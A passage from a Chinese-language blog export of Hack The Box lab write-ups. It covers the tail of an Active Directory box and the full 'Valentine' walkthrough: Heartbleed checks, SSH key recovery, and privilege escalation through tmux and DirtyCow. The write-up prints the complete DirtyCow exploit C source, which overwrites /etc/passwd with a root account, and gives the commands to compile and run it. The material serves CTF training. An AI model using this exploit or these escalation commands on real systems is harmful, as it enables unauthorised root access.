Add-DomainGroupMember -Identity <span class="string">&#x27;Backup_Admins&#x27;</span> -Members <span class="string">&#x27;claire&#x27;</span> -Credential <span class="variable">$cred</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure>

<p>whoami /all查看到我们已经处于backup_admins组中了<br><img src="https://img-blog.csdnimg.cn/9ff1c27957d54fe3b71bfa62126f58b1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我们还是无法查看root.txt的内容，我们却可以查看<code>Backup Scripts</code>的内容<br><img src="https://img-blog.csdnimg.cn/b4491a3626c84023b3f122732aa44800.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我们在<code>BackupScript.ps1</code>中找到管理员的密码<br><img src="https://img-blog.csdnimg.cn/3285fc7c314a4f98840bb0bc74f27320.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>直接登录管理员账号<br><img src="https://img-blog.csdnimg.cn/f96c6ddacbff4775947400c9dfd03743.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>邮箱钓鱼</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Valentine</title>
    <url>/2021/12/24/Valentine/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/48b5e5c02ff845d5b280499511915293.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以看到主机开放了web服务和ssh服务，这里发现了<code>valentine.htb</code>这个子域，我们可以将它对应的解析地址添加到hosts文件中去<br><img src="https://img-blog.csdnimg.cn/a1a3512aec184664808f7b0dfdab121b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>访问其web服务的时候，就只有一张图片，查看代码源码啥的都没有，但是这张图片的心脏在滴血，我们不难猜到是心脏滴血漏洞吧<br><img src="https://img-blog.csdnimg.cn/d9abb29e5cc84619b8c2c6942db20ce4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们想用脚本检测一下是否存在心脏滴血漏洞，这里有两种方法检测这个漏洞，一种是使用<code>heartbleed.py</code>这个python脚本，另一种是使用nmap自带的nse脚本检测<br><img src="https://img-blog.csdnimg.cn/59444c0ee5d544d298302502fd349bb4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/49fbb69ace90495f904853d28bb58c96.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们发现了一段base64的加密信息<code>$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==</code>，解码发现明文是<code>heartbleedbelievethehype</code>，不知道是什么，先留着或许后面有用。<br><img src="https://img-blog.csdnimg.cn/c2499b79b1d24bf5b41b4827e80eab52.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>目前来说没啥可利用的信息了，我们进行扫一波目录吧。发现了三个可访问的目录<br><img src="https://img-blog.csdnimg.cn/921fb947413e49f9835045472777f608.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>dev目录下，我们发现了一个<code>hype_key</code>和<code>notes.txt</code>这两个文件<br><img src="https://img-blog.csdnimg.cn/aca3b9d5338b426880717055af939c05.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开hype_key发现是一堆十六进制的字符，我们解码之后发现是一个私钥<br><img src="https://img-blog.csdnimg.cn/ca8014a8611e4285a8dcc55497aee1f6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="https://img-blog.csdnimg.cn/b2d08002b1724754a58cebb6117ef1b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们发现之前不是有一个类似密码的字符串的吗。我们尝试登陆，并且成功了，我们可以查看到user.txt文件内容<br><img src="https://img-blog.csdnimg.cn/2e18c2941c3045edaccc7ebcbcdc2db3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/afb0ff3e8d0145d9bf0d2a26c4608e2b.png" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这里我们开启一个服务器，上传<code>linpeas.sh</code>这个脚本到目标机器上，这个脚本功能非常强大，是专门针对Linux提权的一个脚本工具。它是由Carlos P创建的，目的是列举在Linux系统上提升特权的所有可能方法。<br><img src="https://img-blog.csdnimg.cn/d6d15cb2cccf4a7fa46092fd5a3db58e.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/06085062db3d40459a5ecef0a53d7a13.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>赋予执行权限并运行这个脚本，这里有两种提权的方法，一种是脏牛提权，这个简单快捷；另一种利用<code>tmux</code>这个应用程序来实施提权。</p>
<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>这里我们发现这个Linux版本较低，那么我们可以使用脏牛进行提权<br><img src="https://img-blog.csdnimg.cn/d06348beabfc4b279891a1cfc60a32a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在<code>exploit-db</code>上可以发现利用的脚本<br><img src="https://img-blog.csdnimg.cn/4e45a7c7bc434452b0dbe78a15ff87c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这是整个脚本的内容</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span></span><br><span class="line"><span class="comment">// as a base and automatically generates a new passwd line.</span></span><br><span class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></span><br><span class="line"><span class="comment">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span></span><br><span class="line"><span class="comment">// and overwrites the root account with the generated line.</span></span><br><span class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></span><br><span class="line"><span class="comment">// created user.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// To use this exploit modify the user values according to your needs.</span></span><br><span class="line"><span class="comment">//   The default is &quot;firefart&quot;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span></span><br><span class="line"><span class="comment">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Compile with:</span></span><br><span class="line"><span class="comment">//   gcc -pthread dirty.c -o dirty -lcrypt</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Then run the newly create binary by either doing:</span></span><br><span class="line"><span class="comment">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span></span><br><span class="line"><span class="comment">//   mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span></span><br><span class="line"><span class="comment">// https://firefart.at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *backup_filename = <span class="string">&quot;/tmp/passwd.bak&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *salt = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></span><br><span class="line">   <span class="keyword">char</span> *username;</span><br><span class="line">   <span class="keyword">char</span> *hash;</span><br><span class="line">   <span class="keyword">int</span> user_id;</span><br><span class="line">   <span class="keyword">int</span> group_id;</span><br><span class="line">   <span class="keyword">char</span> *info;</span><br><span class="line">   <span class="keyword">char</span> *home_dir;</span><br><span class="line">   <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_password_hash</span><span class="params">(<span class="keyword">char</span> *plaintext_pw)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_passwd_line</span><span class="params">(struct Userinfo u)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *format = <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>;</span><br><span class="line">  <span class="keyword">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *from, <span class="keyword">const</span> <span class="keyword">char</span> *to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// check if target file already exists</span></span><br><span class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;File %s already exists! Please delete it and run again\n&quot;</span>,</span><br><span class="line">      to);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s successfully backed up to %s\n&quot;</span>,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// backup file</span></span><br><span class="line">  <span class="keyword">int</span> ret = copy_file(filename, backup_filename);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></span><br><span class="line">  <span class="comment">// set values, change as needed</span></span><br><span class="line">  user.username = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line">  user.user_id = <span class="number">0</span>;</span><br><span class="line">  user.group_id = <span class="number">0</span>;</span><br><span class="line">  user.info = <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">  user.home_dir = <span class="string">&quot;/root&quot;</span>;</span><br><span class="line">  user.shell = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    plaintext_pw = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new password: %s\n&quot;</span>, plaintext_pw);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    plaintext_pw = getpass(<span class="string">&quot;Please enter the new password: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  <span class="keyword">char</span> *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Complete line:\n%s\n&quot;</span>, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</span><br><span class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid) &#123;</span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> u, i, o, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      <span class="built_in">map</span> + o,</span><br><span class="line">                      *((<span class="keyword">long</span>*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Done! Check %s to see if the new user was created.\n&quot;</span>, filename);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;</span>,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;</span>,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将脏牛脚本下载到目标机器上<br><img src="https://img-blog.csdnimg.cn/7be0601d01a245d49b8a950a8e1a4dd1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后编译并运行这个脚本，新设置的密码为空</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40389.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/cf62ba35819c4ce38f1c526d9914aeae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/01e976057cfd436eaf24c2139dbc1cd0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="tmux提权"><a href="#tmux提权" class="headerlink" title="tmux提权"></a>tmux提权</h2><p>除了脏牛，我们还发现以root用户运行的tmux程序<br><img src="https://img-blog.csdnimg.cn/ee02125d05bb444ca867c42b495afc29.png" alt="在这里插入图片描述"><br>那么我们直接运行命令，就能够提权到root上了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/tmux -S /.devs/dev_sess</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b4674887be004a4a8ba43204d0642eed.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>心脏滴血</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
</search>
